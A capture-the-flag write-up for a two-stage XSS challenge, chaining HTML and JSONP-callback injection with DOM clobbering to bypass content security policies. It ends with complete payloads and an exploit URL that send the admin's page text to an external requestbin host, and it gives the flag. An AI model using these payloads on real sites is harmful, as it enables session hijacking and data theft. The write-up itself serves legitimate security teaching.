# Xmas Shopping Site

For this challenge we are provided with the URL of a website `http://staywoke.hax1.allesctf.net/`. The setup is that of a standard XSS challenge: we can submit URLs for inspection at `http://submit.xss.allesctf.net/`, and have to retrieve the flag from the admin by submitting a malicious URL. Browsing around, we can see that the challenge is divided into two stages: first, we have to gain script execution in stage 1, so we can extract the `token` for stage 2. Then we gain script execution in stage 2 and retrieve the flag.

## Stage 1

Stage 1 uses a CSP of `default-src 'self' http://*.xss.allesctf.net; object-src 'none'; base-uri 'none';`, so we cannot inject inline scripts. Testing the functionality of the site, we quickly notice that `/?search=injection` is reflected on the site and insufficiently escaped. We can use that to inject arbitrary HTML into the page, but scripts are blocked by the CSP.

The page loads a script from `/items.php?cb=parseItems` to display the available items. This endpoint is also vulnerable to an injection: we can send arbitrary JS code as a callback and it will be reflected in the returned script. The callback parameter is limited to 250 characters, but we can easily bypass this limit by including additional data in HTML elements inserted by the HTML injection.

Putting both of these bugs together, we can bypass the CSP and execute arbitrary scripts on stage 1.

## Stage 2

Stage 2 uses a CSP of `script-src 'nonce-XXX' 'strict-dynamic'`, so all script elements are annotated with a randomly generated nonce, but existing scripts can add new script elements to the DOM, even if the new elements don't have a nonce.

When changing the background image with a POST request to `/`, parameters `bg=injection`, we can inject arbitrary HTML into the returned page, because no filtering or escaping is done on the new background value. This bug is reachable from stage 1, because its CSP allows POST requests to `stage2.xss.allesctf.net`. The returned content will be blocked by the SOP, but we don't need that content anyways.

The `background.js` script used by the page contains the following line: `$("body").append(backgrounds[$("#bg").val()]);`, which is executed after the page is loaded. If we could control the contents of the `backgrounds` array at that point, we could append a script element to the body, bypassing the CSP.

The `backgrounds` array is defined in an inline script located after our injection, so by ending the injected HTML with an opening `<script>` tag without nonce, we can invalidate the inline script and it will be skipped by the browser (the real opening script tag will be ignored, because it's inside a script tag). Now the `backgrounds` array will not be defined, but we don't have any way of defining it ourselves, since we cannot execute JS code!

But actually, we don't have to define `backgrounds` as an array. If `backgrounds` was not defined by JS code and an element with id `backgrounds` exists, the reference to `backgrounds` will evaluate to that element (this technique is referred to as DOM clobbering). We can simply inject an input element with `id=backgrounds` and `value="<script>alert(1)</script>"`, while setting the background to `value`. This way our script will be injected into the page, and we have arbitrary script execution on stage 2.

## Exploit

Now all that's left to do is putting all the bugs we found in both stages together to construct our exploit.

Let's start with the innermost payload, and work our way outwards: `$("body").append("<img src="+String.fromCharCode(34)+"http://requestbin.net/r/19yiqo91?"+btoa(unescape(encodeURIComponent($("b").text())))+String.fromCharCode(34)+">")`. This will grab the text from all `b` elements and send it to our requestbin.

The next layer is the HTML injection in stage 2: `value"><input type="hidden" id="backgrounds" value='<script>STAGE2_SCRIPT_HERE</script>'><script>`. This suppresses the inline script and clobbers `backgrounds` as described above.

This is the script for stage 1: `fun=function(){window.location=stage2.href};fetch(stage2.href,{headers:{'Content-type':'application/x-www-form-urlencoded'},method:'POST',credentials:'include',body:'bg='+encodeURIComponent(atob(xs.value))}).then(fun,fun)//`. It sends our exploit for stage 2 from the value of the `xs` element with a POST request to stage 2, and then redirects to stage 2.

Now on to the HTML injection in stage 1: `<input type="hidden" id="xs" value="STAGE2_BASE64_HERE"><script src="/items.php?cb=STAGE1_SCRIPT_URICOMPONENT_HERE"></script>`. Here, we include the exploit for stage 2, and load the script for stage 1.

When we replace all placeholders with the appropriate contents we get the final exploit payload:

```
script in stage 2:
$("body").append("<img src="+String.fromCharCode(34)+"http://requestbin.net/r/19yiqo91?"+btoa(unescape(encodeURIComponent($("b").text())))+String.fromCharCode(34)+">")

injection in stage 2:
value"><input type="hidden" id="backgrounds" value='<script>$("body").append("<img src="+String.fromCharCode(34)+"http://requestbin.net/r/19yiqo91?"+btoa(unescape(encodeURIComponent($("b").text())))+String.fromCharCode(34)+">")</script>'><script>

script in stage 1:
fun=function(){window.location=stage2.href};fetch(stage2.href,{headers:{'Content-type':'application/x-www-form-urlencoded'},method:'POST',credentials:'include',body:'bg='+encodeURIComponent(atob(xs.value))}).then(fun,fun)//

injection in stage 1:
<input type="hidden" id="xs" value="dmFsdWUiPjxpbnB1dCB0eXBlPSJoaWRkZW4iIGlkPSJiYWNrZ3JvdW5kcyIgdmFsdWU9JzxzY3JpcHQ+JCgiYm9keSIpLmFwcGVuZCgiPGltZyBzcmM9IitTdHJpbmcuZnJvbUNoYXJDb2RlKDM0KSsiaHR0cDovL3JlcXVlc3RiaW4ubmV0L3IvMTl5aXFvOTE/IitidG9hKHVuZXNjYXBlKGVuY29kZVVSSUNvbXBvbmVudCgkKCJiIikudGV4dCgpKSkpK1N0cmluZy5mcm9tQ2hhckNvZGUoMzQpKyI+Iik8L3NjcmlwdD4nPjxzY3JpcHQ+"><script src="/items.php?cb=fun%3Dfunction()%7Bwindow.location%3Dstage2.href%7D%3Bfetch(stage2.href%2C%7Bheaders%3A%7B'Content-type'%3A'application%2Fx-www-form-urlencoded'%7D%2Cmethod%3A'POST'%2Ccredentials%3A'include'%2Cbody%3A'bg%3D'%2BencodeURIComponent(atob(xs.value))%7D).then(fun%2Cfun)%2F%2F"></script>

exploit url:
http://xss.allesctf.net/?search=%3Cinput%20type%3D%22hidden%22%20id%3D%22xs%22%20value%3D%22dmFsdWUiPjxpbnB1dCB0eXBlPSJoaWRkZW4iIGlkPSJiYWNrZ3JvdW5kcyIgdmFsdWU9JzxzY3JpcHQ%2BJCgiYm9keSIpLmFwcGVuZCgiPGltZyBzcmM9IitTdHJpbmcuZnJvbUNoYXJDb2RlKDM0KSsiaHR0cDovL3JlcXVlc3RiaW4ubmV0L3IvMTl5aXFvOTE%2FIitidG9hKHVuZXNjYXBlKGVuY29kZVVSSUNvbXBvbmVudCgkKCJiIikudGV4dCgpKSkpK1N0cmluZy5mcm9tQ2hhckNvZGUoMzQpKyI%2BIik8L3NjcmlwdD4nPjxzY3JpcHQ%2B%22%3E%3Cscript%20src%3D%22%2Fitems.php%3Fcb%3Dfun%253Dfunction()%257Bwindow.location%253Dstage2.href%257D%253Bfetch(stage2.href%252C%257Bheaders%253A%257B'Content-type'%253A'application%252Fx-www-form-urlencoded'%257D%252Cmethod%253A'POST'%252Ccredentials%253A'include'%252Cbody%253A'bg%253D'%252BencodeURIComponent(atob(xs.value))%257D).then(fun%252Cfun)%252F%252F%22%3E%3C%2Fscript%3E
```

By submitting this URL to the admin, we obtain the flag: `CSCG{c0ngratZ_y0u_l3arnD_sUm_jS:>}`
